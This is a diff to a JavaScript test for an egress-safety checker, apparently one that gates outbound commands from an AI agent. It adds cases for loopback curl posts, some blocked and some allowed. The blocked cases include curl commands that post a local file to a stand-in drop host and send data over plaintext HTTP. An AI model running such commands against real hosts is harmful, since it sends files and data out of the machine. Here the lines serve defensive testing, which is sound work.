@@ -508,7 +508,9 @@ test('TPW-20: data going out is gated, content coming in is not', () => {
     ['fused data flag',   'curl -d@/tmp/body.json https://drop.example'],
     // The allowlist is https-only: a plaintext hop is one listener away from
     // being read by somebody else, so a listed host does not rescue it.
-    ['plaintext to listed host', 'curl -d x=1 http://github.com/hook']
+    ['plaintext to listed host', 'curl -d x=1 http://github.com/hook'],
+    // Loopback is not a blanket pass: only the operator's own core port is.
+    ['other loopback listener',  'curl -d x=1 http://127.0.0.1:11437/embed']
   ];
   for (const [label, cmd] of blocked) {
     const r = safety._checkEgress(cmd, listed);
@@ -529,7 +531,9 @@ test('TPW-20: data going out is gated, content coming in is not', () => {
     // scp and rsync are host-keyed and operator-configured, and their secret
     // shapes are already refused by the exfiltration rule. Widening this to
     // them would gate every deploy on a list built for a web fetcher.
-    ['scp untouched',      'scp /tmp/dist.tgz buildhost:/srv/']
+    ['scp untouched',      'scp /tmp/dist.tgz buildhost:/srv/'],
+    // The operator's own core on loopback: the send never leaves the machine.
+    ['own core, loopback', 'curl -X POST http://127.0.0.1:8000/v1/messages -d @/tmp/body.json']
   ];
   for (const [label, cmd] of fine) {
     assert.strictEqual(safety._checkEgress(cmd, listed), null, 'over-refused (' + label + '): ' + cmd);
